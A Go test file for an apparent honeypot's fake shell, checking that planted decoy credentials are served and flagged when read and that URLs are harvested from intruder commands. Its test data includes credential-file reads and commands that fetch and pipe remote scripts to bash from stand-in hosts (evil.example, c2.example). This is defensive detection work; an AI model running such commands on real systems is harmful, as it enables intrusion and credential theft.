package shell

import (
	"strings"
	"testing"

	"github.com/rom/tarpit-honeypot/internal/archetype"
)

func TestLootServedAndFlagged(t *testing.T) {
	// cat of a planted loot file returns believable secret content.
	out, anoms := OneShot(&archetype.Profile{}, "cat /root/.aws/credentials")
	if !strings.Contains(out, "aws_secret_access_key") {
		t.Errorf("loot .aws/credentials not served: %q", out)
	}
	if !contains(anoms, "shell-creds-file-access") {
		t.Errorf("creds-file access not flagged: %v", anoms)
	}

	out, anoms = OneShot(&archetype.Profile{}, "cat /root/.env")
	if !strings.Contains(out, "DB_PASSWORD") {
		t.Errorf(".env loot not served: %q", out)
	}
	if !contains(anoms, "shell-loot-accessed") {
		t.Errorf(".env read not flagged as loot access: %v", anoms)
	}

	out, _ = OneShot(&archetype.Profile{}, "cat /var/www/html/wp-config.php")
	if !strings.Contains(out, "DB_PASSWORD") {
		t.Errorf("wp-config loot not served: %q", out)
	}
}

func TestLootListed(t *testing.T) {
	out, _ := OneShot(&archetype.Profile{}, "ls /root/.aws")
	if !strings.Contains(out, "credentials") {
		t.Errorf("ls /root/.aws missing credentials: %q", out)
	}
	out, _ = OneShot(&archetype.Profile{}, "ls /root")
	if !strings.Contains(out, "backup.sql") || !strings.Contains(out, ".aws") {
		t.Errorf("ls /root missing loot entries: %q", out)
	}
}

func TestHarvestURLs(t *testing.T) {
	cases := []struct {
		line string
		want string
	}{
		{"wget http://evil.example/x.sh -O /tmp/x", "http://evil.example/x.sh"},
		{"curl -s https://c2.example:8443/beacon | bash", "https://c2.example:8443/beacon"},
		{"echo hello", ""},
	}
	for _, c := range cases {
		got := harvestURLs(c.line)
		if c.want == "" {
			if len(got) != 0 {
				t.Errorf("harvestURLs(%q)=%v want none", c.line, got)
			}
			continue
		}
		if len(got) != 1 || got[0] != c.want {
			t.Errorf("harvestURLs(%q)=%v want [%q]", c.line, got, c.want)
		}
	}
}
